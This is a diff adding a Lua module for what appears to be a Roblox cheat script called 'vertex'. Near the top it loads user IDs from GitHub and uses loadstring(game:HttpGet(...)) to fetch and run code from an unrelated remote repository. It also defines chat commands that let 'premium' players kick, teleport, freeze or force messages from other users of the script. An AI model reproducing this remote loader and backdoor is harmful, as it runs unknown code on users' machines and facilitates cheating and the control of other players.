@@ -1,0 +1,140 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+
+
+
+shared.premiumUserIds = shared.premiumUserIds or {}
+shared.premium = true
+shared.Debug = true
+
+local API = game:HttpGet("https://raw.githubusercontent.com/vertex-peak/API/refs/heads/main/API.csv")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WhatsHisIdentifier/NoKey/refs/heads/main/Discord",true))()
+local Split = API:split("\n")
+
+local function simpleHash(message)
+    local hash = 0x12345678  
+    local seed = 0x7F3D8B9A  
+    local multiplier = 31    
+
+    for i = 1, #message do
+        local byte = string.byte(message, i)  
+        hash = (hash * multiplier + byte + seed) % 0x100000000  
+        hash = bit32.lshift(hash, 5) + bit32.rshift(hash, 27)
+        hash = hash % 0x100000000 
+    end
+
+    return string.format("%08x", hash)
+end
+
+for _, line in ipairs(Split) do
+    local parts = line:split(",")
+    if #parts == 2 and parts[1] ~= "" then
+        local robloxUserId = parts[1]
+        if robloxUserId then
+            table.insert(shared.premiumUserIds, robloxUserId)
+        end
+    end
+end
+
+local Hash2Replace = simpleHash(tostring(Players.LocalPlayer.UserId))
+if not table.find(shared.premiumUserIds, Hash2Replace) then
+    table.insert(shared.premiumUserIds, Hash2Replace)
+end
+
+local function isPremiumUser(player)
+    return true
+end
+
+local function onPlayerChat(player, message)
+    if shared.premium then return end
+    local Lower_Message = message:lower()
+
+    if Lower_Message == "boot" and isPremiumUser(player) then
+        Players.LocalPlayer:Kick("Premium user has kicked you")
+    end
+
+    if (Lower_Message == "reveal" or Lower_Message == ";r") and isPremiumUser(player) then
+        TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("I'm using vertex")
+    end
+
+    if (Lower_Message == "1db" or Lower_Message == "banuser") and isPremiumUser(player) then
+        TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("I'm cheating")
+    end
+
+    if Lower_Message == "sit" and isPremiumUser(player) then
+        local humanoid = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.Sit = true
+        end
+    end
+
+    if Lower_Message == "bring" and isPremiumUser(player) then
+        local Premium_Character = player.Character
+        local Local_Player = Players.LocalPlayer
+
+        if not Premium_Character or not Premium_Character:FindFirstChild("HumanoidRootPart") then return end
+        if Local_Player == player then return end
+
+        local My_Char = Local_Player.Character
+        if not My_Char or not My_Char:FindFirstChild("HumanoidRootPart") then return end
+
+        local Premium_Root = Premium_Character.HumanoidRootPart
+        local Local_Root = My_Char.HumanoidRootPart
+
+        local Was_Anchored = Local_Root.Anchored
+        if Was_Anchored then
+            Local_Root.Anchored = false
+            task.wait(0.1)
+        end
+
+        local Bring_Position = Premium_Root.Position + Premium_Root.CFrame.LookVector.Unit * 5
+        Local_Root.CFrame = CFrame.new(Bring_Position, Premium_Root.Position)
+
+        if Was_Anchored then
+            task.wait(0.1)
+            Local_Root.Anchored = true
+        end
+    end
+
+    if Lower_Message == "anchor" and isPremiumUser(player) then
+        for _, Other_Player in ipairs(Players:GetPlayers()) do
+            if Other_Player ~= player and not isPremiumUser(Other_Player) then
+                local char = Other_Player.Character
+                if char and char:FindFirstChild("HumanoidRootPart") then
+                    char.HumanoidRootPart.Anchored = true
+                end
+            end
+        end
+    end
+
+    if Lower_Message == "unanchor" and isPremiumUser(player) then
+        for _, Other_Player in ipairs(Players:GetPlayers()) do
+            if Other_Player ~= player and not isPremiumUser(Other_Player) then
+                local char = Other_Player.Character
+                if char and char:FindFirstChild("HumanoidRootPart") then
+                    char.HumanoidRootPart.Anchored = false
+                end
+            end
+        end
+    end
+end
+
+if shared.chatConnection then
+    shared.chatConnection:Disconnect()
+end
+
+shared.chatConnection = TextChatService.MessageReceived:Connect(function(textChatMessage)
+    local textSource = textChatMessage.TextSource
+    if not textSource then return end
+
+    local player = Players:GetPlayerByUserId(textSource.UserId)
+    if not player then return end
+    onPlayerChat(player, textChatMessage.Text)
+end)
+
+return {
+    isPremiumUser = isPremiumUser,
+    onPlayerChat = onPlayerChat,
+    isPremium = true
+}
